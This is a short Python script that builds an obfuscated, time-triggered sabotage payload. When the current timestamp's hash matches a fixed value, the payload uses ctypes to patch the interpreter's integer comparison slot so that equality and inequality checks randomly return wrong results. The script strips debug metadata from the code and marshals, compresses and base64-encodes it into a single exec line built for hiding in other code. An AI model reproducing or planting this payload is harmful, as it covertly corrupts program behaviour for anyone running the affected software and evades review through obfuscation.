import types, marshal

def _():
    import ctypes as c, random
    if (t := int(__import__("time").time())) and __import__("hashlib").sha256(str(t).encode()).hexdigest() != "366616c67ff892dacc8b79634352ba2b019f3cc5c99dd4d16ea296af30579606": return
    random.seed(t)
    v=(c.c_void_p*60).from_address(id(int));s=v[25]
    @(o:=c.CFUNCTYPE(c.py_object,c.py_object,c.py_object,c.c_int))
    def f(a,b,p,o=o(s),g=random.getrandbits):
        r = o(a,b,p)
        if p.__eq__(2) or p.__eq__(3):  
            return not r if g(1) else r
        return r
    v[25]=c.cast(f,c.c_void_p).value
    globals()['u']=lambda v=v,s=s:v.__setitem__(25,s)   

def strip(code):
    consts = tuple(
        strip(c) if isinstance(c, types.CodeType) else c
        for c in code.co_consts
    )
    return code.replace(
        co_filename='',
        co_name='',
        co_qualname='',
        co_firstlineno=0,
        co_linetable=b'',
        co_consts=consts
    )

_.__code__ = strip(_.__code__)
bytecode = marshal.dumps(_.__code__)
code = marshal.loads(bytecode)

import base64, zlib

payload = f"__import__('types').FunctionType(__import__('marshal').loads({bytecode}), globals())()".encode()
payload = base64.b64encode(f"exec(__import__('zlib').decompress({zlib.compress(payload)}))".encode())
payload = f"exec(__import__('base64').b64decode({payload}))"

print(payload)

# exec(payload)



